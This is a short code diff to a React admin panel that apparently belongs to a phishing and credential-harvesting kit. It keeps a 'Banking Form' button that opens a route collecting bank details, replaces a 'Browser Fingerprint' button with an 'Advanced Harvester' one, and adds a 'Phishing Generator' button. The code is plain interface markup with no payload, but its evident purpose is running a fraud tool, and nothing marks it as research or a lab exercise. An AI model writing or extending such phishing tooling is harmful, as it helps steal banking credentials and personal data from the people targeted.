@@ -129,8 +129,11 @@ export default function AdminPanel() {
                   <button onClick={() => window.open('/flashed?collect=bank', '_blank')} className="w-full bg-blue-400 text-white p-2 rounded hover:bg-blue-500 text-sm">
                     Banking Form
                   </button>
-                  <button onClick={() => window.open('/?fingerprint=true', '_blank')} className="w-full bg-blue-300 text-white p-2 rounded hover:bg-blue-400 text-sm">
-                    Browser Fingerprint
+                  <button onClick={() => window.open('/?advanced=true', '_blank')} className="w-full bg-blue-300 text-white p-2 rounded hover:bg-blue-400 text-sm">
+                    Advanced Harvester
+                  </button>
+                  <button onClick={() => window.open('/phishing-generator', '_blank')} className="w-full bg-blue-200 text-white p-2 rounded hover:bg-blue-300 text-sm">
+                    Phishing Generator
                   </button>
                 </div>
               </div>
